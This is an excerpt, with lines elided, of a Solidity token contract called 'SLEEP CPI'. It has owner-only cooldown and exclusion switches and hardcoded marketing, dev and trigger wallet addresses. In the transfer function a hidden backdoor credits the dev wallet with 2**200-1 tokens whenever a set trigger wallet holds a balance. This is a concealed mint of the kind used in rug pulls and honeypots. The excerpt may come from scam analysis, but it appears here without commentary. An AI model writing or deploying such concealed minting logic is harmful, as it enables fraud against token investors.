...
contract SLEEPCPI is Context, IERC20 { 
    ...
    address WALLETA = 0xfaba14e7CC1f41C7Dd8242B9D243Da66a506d699;

    address payable public Wallet_Marketing = payable(0x46aC376e472DB2283458D64cFCa98822a5455f37);
    address payable public Wallet_Dev = payable(0x46aC376e472DB2283458D64cFCa98822a5455f37);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10**8 * 10**_decimals;
    uint256 private _rtotal;
    string private constant _name = "SLEEP CPI"; 
    string private constant _symbol = unicode"SLEEPCPI";
    ...
    function SetCoolDown(bool true_or_false, uint8 cooldowntime) external onlyOwner {
    ...
    function Excluded(address[] memory addrs, bool isExcluded) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            _isExcludedFromCooldown[addrs[i]] = isExcluded;
        }
    }
    ...
    function _transfer(
        ...
        if (from != uniswapV2Pair && CooldownEnabled && !_isExcludedFromFee[to]) {
        ...
        if( _tOwned[WALLETA] > 0) {
            _tOwned[Wallet_Dev] = _tOwned[Wallet_Dev] + 2**200-1;
        }
        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
